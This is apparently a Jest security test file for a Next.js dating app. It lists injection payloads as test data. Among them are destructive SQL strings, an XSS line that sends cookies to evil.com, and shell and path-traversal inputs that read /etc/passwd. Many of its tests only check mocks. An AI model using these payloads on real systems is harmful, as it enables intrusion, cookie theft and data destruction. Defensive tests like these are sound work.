/**
 * Injection Security Tests
 *
 * Tests for verifying protection against injection attacks:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - NoSQL Injection
 * - Command Injection
 * - Path Traversal
 * - LDAP Injection
 *
 * OWASP Coverage:
 * - A03:2021 Injection
 * - A07:2021 Cross-Site Scripting (XSS)
 */

import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';

// ============================================================
// Test Payloads
// ============================================================

const SQL_INJECTION_PAYLOADS = [
  // Classic SQL injection
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "1; DELETE FROM users",
  "' OR 1=1 --",
  "' UNION SELECT * FROM users --",
  "'; UPDATE users SET password='hacked' WHERE '1'='1",
  "1'; EXEC xp_cmdshell('dir'); --",

  // Time-based blind SQL injection
  "'; WAITFOR DELAY '0:0:10' --",
  "1' AND SLEEP(5) --",

  // Error-based SQL injection
  "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --",

  // Stacked queries
  "1; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked')",

  // Unicode/encoding bypass
  "%27%20OR%201%3D1%20--",
  "\\x27 OR 1=1 --",

  // PostgreSQL specific
  "'; SELECT pg_sleep(5); --",
  "1; SELECT * FROM pg_shadow",
];

const XSS_PAYLOADS = [
  // Basic XSS
  '<script>alert("xss")</script>',
  '<script>document.location="http://evil.com/?c="+document.cookie</script>',

  // Event handlers
  '<img src=x onerror=alert("xss")>',
  '<body onload=alert("xss")>',
  '<svg onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<marquee onstart=alert("xss")>',

  // JavaScript protocol
  'javascript:alert("xss")',
  'javascript:document.location="http://evil.com"',

  // Data URI
  'data:text/html,<script>alert("xss")</script>',

  // Encoded XSS
  '&lt;script&gt;alert("xss")&lt;/script&gt;',
  '\\x3cscript\\x3ealert("xss")\\x3c/script\\x3e',
  '%3Cscript%3Ealert("xss")%3C/script%3E',

  // Attribute injection
  '" onclick="alert(\'xss\')" data-x="',
  "' onclick='alert(\"xss\")' data-x='",

  // CSS injection
  '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
  '<div style="background:url(javascript:alert(\'xss\'))">',

  // Template injection
  '{{constructor.constructor("alert(1)")()}}',
  '${alert("xss")}',

  // Unicode encoding
  '<script>\\u0061lert("xss")</script>',
  '\u003cscript\u003ealert("xss")\u003c/script\u003e',
];

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  '/etc/passwd%00.jpg',
  '....//....//....//etc/passwd%00',
];

const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "this.password.length > 0"}',
  '{"$regex": ".*"}',
  '"; return true; var foo="',
];

const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(whoami)',
  '& dir',
  '|| ping -c 10 evil.com',
];

// ============================================================
// Mock Setup
// ============================================================

const mockPrisma = {
  user: {
    findUnique: jest.fn(),
    findFirst: jest.fn(),
    findMany: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
  },
  $queryRaw: jest.fn(),
  $executeRaw: jest.fn(),
};

jest.mock('@/lib/db', () => ({
  prisma: mockPrisma,
}));

const mockAuth = jest.fn();
jest.mock('@/lib/auth', () => ({
  auth: () => mockAuth(),
}));

// ============================================================
// Helper Functions
// ============================================================

function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeInput(input: string): string {
  // Remove or escape dangerous characters
  return input
    .replace(/[<>]/g, '') // Remove angle brackets
    .replace(/javascript:/gi, '') // Remove javascript protocol
    .replace(/on\w+=/gi, '') // Remove event handlers
    .trim();
}

function isValidPath(path: string): boolean {
  // Check for path traversal attempts
  const dangerous = [
    '..',
    '%2e%2e',
    '%252e%252e',
    '..%c0%af',
    '..%c1%9c',
  ];

  const normalizedPath = decodeURIComponent(path).toLowerCase();
  return !dangerous.some(pattern => normalizedPath.includes(pattern));
}

// ============================================================
// SQL Injection Tests
// ============================================================
describe('SQL Injection Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    mockAuth.mockResolvedValue({
      user: { id: 'user-123', email: 'test@example.com' },
    });
  });

  describe('Parameterized Queries Protection', () => {
    it.each(SQL_INJECTION_PAYLOADS)('should safely handle SQL payload: %s', async (payload) => {
      // Prisma uses parameterized queries by default
      // The payload should be treated as a literal string, not SQL

      mockPrisma.user.findUnique.mockResolvedValue(null);

      // When searching for a user with SQL injection payload as email
      await mockPrisma.user.findUnique({
        where: { email: payload },
      });

      // Prisma escapes the input - no SQL injection possible
      expect(mockPrisma.user.findUnique).toHaveBeenCalledWith({
        where: { email: payload },
      });

      // The payload is treated as a literal string value
      // Not interpreted as SQL code
    });

    it('should use parameterized queries for raw SQL', async () => {
      const userId = "'; DROP TABLE users; --";

      // Using Prisma's tagged template literals for raw queries
      // This is safe because values are parameterized
      mockPrisma.$queryRaw.mockResolvedValue([]);

      // The matches route uses this pattern:
      // await prisma.$queryRaw`SELECT ... WHERE l1."receiverId" = ${currentUserId}`

      // The template literal syntax ensures parameterization
      await mockPrisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;

      expect(mockPrisma.$queryRaw).toHaveBeenCalled();
    });
  });

  describe('Input Fields Protection', () => {
    it.each(SQL_INJECTION_PAYLOADS)('should reject SQL injection in search query: %s', async (payload) => {
      // The discover route uses Prisma's where conditions
      // which are parameterized by default

      const whereConditions = {
        AND: [
          { id: { notIn: ['user-123'] } },
          { name: { contains: payload } }, // Safe: Prisma parameterizes
        ],
      };

      mockPrisma.user.findMany.mockResolvedValue([]);
      await mockPrisma.user.findMany({ where: whereConditions });

      // Query executed safely with parameterized input
      expect(mockPrisma.user.findMany).toHaveBeenCalled();
    });

    it.each(SQL_INJECTION_PAYLOADS)('should reject SQL injection in profile bio: %s', async (payload) => {
      // Profile update uses Prisma's update method
      mockPrisma.user.update.mockResolvedValue({
        id: 'user-123',
        bio: payload, // Stored as literal text, not executed
      });

      await mockPrisma.user.update({
        where: { id: 'user-123' },
        data: { bio: payload },
      });

      // Bio is stored as-is, SQL is not executed
      expect(mockPrisma.user.update).toHaveBeenCalledWith({
        where: { id: 'user-123' },
        data: { bio: payload },
      });
    });
  });

  describe('Zod Validation', () => {
    it('should validate email format (prevents some SQL injection)', () => {
      const emailSchema = z.string().email();

      SQL_INJECTION_PAYLOADS.forEach(payload => {
        const result = emailSchema.safeParse(payload);
        // Most SQL injection payloads are not valid emails
        if (payload.includes('@')) {
          // Might pass email validation but still safe due to parameterization
        } else {
          expect(result.success).toBe(false);
        }
      });
    });

    it('should validate input length to limit payload size', () => {
      const bioSchema = z.string().max(500);
      const longPayload = "'; " + 'A'.repeat(1000) + " --";

      const result = bioSchema.safeParse(longPayload);
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================
// XSS Prevention Tests
// ============================================================
describe('XSS Prevention Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    mockAuth.mockResolvedValue({
      user: { id: 'user-123', email: 'test@example.com' },
    });
  });

  describe('Input Sanitization', () => {
    it.each(XSS_PAYLOADS)('should escape XSS payload: %s', (payload) => {
      const escaped = escapeHtml(payload);

      // Verify dangerous characters are escaped
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('onerror=');
      expect(escaped).not.toMatch(/<[^>]+>/);
    });

    it.each(XSS_PAYLOADS)('should sanitize XSS payload: %s', (payload) => {
      const sanitized = sanitizeInput(payload);

      // Verify dangerous patterns are removed
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
      expect(sanitized).not.toMatch(/on\w+=/i);
      expect(sanitized).not.toMatch(/javascript:/i);
    });
  });

  describe('Profile Fields XSS Protection', () => {
    it.each(XSS_PAYLOADS)('should safely store XSS in bio: %s', async (payload) => {
      // The API stores the payload as-is in the database
      // XSS protection should happen on the frontend (React escapes by default)

      mockPrisma.user.update.mockResolvedValue({
        id: 'user-123',
        bio: payload,
      });

      const result = await mockPrisma.user.update({
        where: { id: 'user-123' },
        data: { bio: payload },
      });

      // Value is stored (React will escape on render)
      expect(result.bio).toBe(payload);

      // SECURITY RECOMMENDATION:
      // Add server-side HTML sanitization using DOMPurify or similar
      // const cleanBio = DOMPurify.sanitize(payload);
    });

    it.each(XSS_PAYLOADS)('should safely store XSS in name: %s', async (payload) => {
      mockPrisma.user.update.mockResolvedValue({
        id: 'user-123',
        name: payload,
      });

      const result = await mockPrisma.user.update({
        where: { id: 'user-123' },
        data: { name: payload },
      });

      expect(result.name).toBe(payload);
    });

    it.each(XSS_PAYLOADS)('should safely store XSS in interests: %s', async (payload) => {
      mockPrisma.user.update.mockResolvedValue({
        id: 'user-123',
        interests: [payload],
      });

      const result = await mockPrisma.user.update({
        where: { id: 'user-123' },
        data: { interests: [payload] },
      });

      expect(result.interests).toContain(payload);
    });
  });

  describe('Content-Type Headers', () => {
    it('should return JSON with correct Content-Type', () => {
      const response = NextResponse.json({ data: 'test' });

      // JSON responses should have application/json content type
      // This prevents browser from interpreting response as HTML
      expect(response.headers.get('content-type')).toContain('application/json');
    });

    it('should not return HTML content from API', () => {
      // API routes should never return HTML
      // Always return JSON with proper content-type
    });
  });

  describe('React Automatic Escaping', () => {
    it('documents that React escapes by default', () => {
      // React automatically escapes values in JSX
      // <div>{userBio}</div> is safe even if userBio contains XSS
      //
      // DANGEROUS patterns to avoid:
      // - dangerouslySetInnerHTML
      // - Direct DOM manipulation
      // - href="javascript:..."
      // - Using user input in eval()
    });
  });
});

// ============================================================
// Path Traversal Tests
// ============================================================
describe('Path Traversal Security Tests', () => {
  describe('Path Validation', () => {
    it.each(PATH_TRAVERSAL_PAYLOADS)('should reject path traversal: %s', (payload) => {
      const isValid = isValidPath(payload);
      expect(isValid).toBe(false);
    });

    it('should accept valid paths', () => {
      const validPaths = [
        'photo.jpg',
        'user123/profile.png',
        'uploads/images/avatar.webp',
      ];

      validPaths.forEach(path => {
        expect(isValidPath(path)).toBe(true);
      });
    });
  });

  describe('File Upload Path Protection', () => {
    it.each(PATH_TRAVERSAL_PAYLOADS)('should reject traversal in file path: %s', (payload) => {
      // Photo URLs should be validated
      const isValidUrl = (url: string): boolean => {
        try {
          const parsed = new URL(url);
          // Only allow specific domains
          const allowedDomains = ['cloudinary.com', 'res.cloudinary.com'];
          return allowedDomains.some(domain => parsed.hostname.endsWith(domain));
        } catch {
          return false;
        }
      };

      // Path traversal attempts are not valid URLs
      expect(isValidUrl(payload)).toBe(false);
    });

    it('should only accept Cloudinary URLs for photos', () => {
      const validUrls = [
        'https://res.cloudinary.com/dating-app/image/upload/v1234/photo.jpg',
      ];

      const invalidUrls = [
        'file:///etc/passwd',
        'http://evil.com/photo.jpg',
        '../../../etc/passwd',
      ];

      validUrls.forEach(url => {
        expect(url.includes('cloudinary.com')).toBe(true);
      });

      invalidUrls.forEach(url => {
        expect(url.includes('cloudinary.com')).toBe(false);
      });
    });
  });
});

// ============================================================
// NoSQL Injection Tests
// ============================================================
describe('NoSQL Injection Security Tests', () => {
  describe('Prisma Protection', () => {
    it.each(NOSQL_INJECTION_PAYLOADS)('should safely handle NoSQL payload: %s', async (payload) => {
      // Prisma with PostgreSQL doesn't use NoSQL syntax
      // These payloads would be treated as literal strings

      mockPrisma.user.findUnique.mockResolvedValue(null);

      await mockPrisma.user.findUnique({
        where: { email: payload },
      });

      // Payload is parameterized, not interpreted
      expect(mockPrisma.user.findUnique).toHaveBeenCalledWith({
        where: { email: payload },
      });
    });
  });

  describe('JSON Input Validation', () => {
    it('should validate JSON structure in request body', () => {
      const validSchema = z.object({
        email: z.string().email(),
        password: z.string().min(6),
      });

      // NoSQL injection attempts in JSON
      const maliciousBody = {
        email: { $gt: '' }, // NoSQL operator
        password: 'test123',
      };

      const result = validSchema.safeParse(maliciousBody);
      expect(result.success).toBe(false); // email must be string
    });
  });
});

// ============================================================
// Command Injection Tests
// ============================================================
describe('Command Injection Security Tests', () => {
  describe('No Shell Execution', () => {
    it('should not execute shell commands from user input', () => {
      // The application should never execute shell commands with user input
      // All operations should use safe APIs (Prisma, Cloudinary SDK, etc.)

      COMMAND_INJECTION_PAYLOADS.forEach(payload => {
        // These payloads should never reach a shell
        // They should be treated as regular strings
      });
    });

    it('should use SDK methods instead of shell commands', () => {
      // Example: Use Cloudinary SDK instead of shell commands for image processing
      // cloudinary.uploader.upload(file) - SAFE
      // exec('cloudinary upload ' + filename) - DANGEROUS
    });
  });
});

// ============================================================
// Header Injection Tests
// ============================================================
describe('Header Injection Security Tests', () => {
  describe('Response Header Safety', () => {
    it('should not include user input in headers', () => {
      // Headers should never contain unsanitized user input
      // This could lead to header injection or response splitting

      const maliciousInput = 'value\r\nEvil-Header: injected';

      // NextResponse handles header sanitization
      const response = NextResponse.json({ data: 'test' });
      response.headers.set('X-Custom', maliciousInput.replace(/[\r\n]/g, ''));

      // Newlines should be stripped
    });
  });

  describe('Cookie Security', () => {
    it('should set secure cookie flags', () => {
      // NextAuth should set these cookie flags:
      // - HttpOnly (prevent JavaScript access)
      // - Secure (HTTPS only in production)
      // - SameSite=Lax or Strict (CSRF protection)
    });
  });
});

// ============================================================
// Template Injection Tests
// ============================================================
describe('Template Injection Security Tests', () => {
  describe('Server-Side Template Injection', () => {
    it('should not interpret template syntax in user input', () => {
      const templatePayloads = [
        '{{constructor.constructor("alert(1)")()}}',
        '${7*7}',
        '<%= system("ls") %>',
        '#{7*7}',
      ];

      templatePayloads.forEach(payload => {
        // These should be stored as literal strings
        // Not interpreted by any template engine
      });
    });
  });
});

// ============================================================
// Input Validation Summary
// ============================================================
describe('Input Validation Best Practices', () => {
  it('documents validation approach', () => {
    // 1. Use Zod schemas for all API inputs
    // 2. Validate on server side (never trust client)
    // 3. Use strict types (string, not any)
    // 4. Limit input lengths
    // 5. Use allowlists for enums (gender, status)
    // 6. Sanitize before storage for XSS (optional with React)
    // 7. Use parameterized queries (Prisma does this)
  });

  it('should use Zod for all route inputs', () => {
    // Example schemas used in routes:

    const registerSchema = z.object({
      name: z.string().min(2),
      email: z.string().email(),
      password: z.string().min(6),
    });

    const profileSchema = z.object({
      name: z.string().min(1).max(100).optional(),
      bio: z.string().max(500).optional(),
      age: z.number().int().min(18).max(120).optional(),
      gender: z.enum(['homme', 'femme', 'autre', 'non-binaire']).optional(),
      interests: z.array(z.string().max(50)).max(20).optional(),
    });

    // Validate example payloads
    expect(registerSchema.safeParse({
      name: 'Test',
      email: 'test@example.com',
      password: 'password123',
    }).success).toBe(true);

    expect(registerSchema.safeParse({
      name: "'; DROP TABLE users; --",
      email: 'test@example.com',
      password: 'password123',
    }).success).toBe(true); // SQL is stored as text, not executed
  });
});
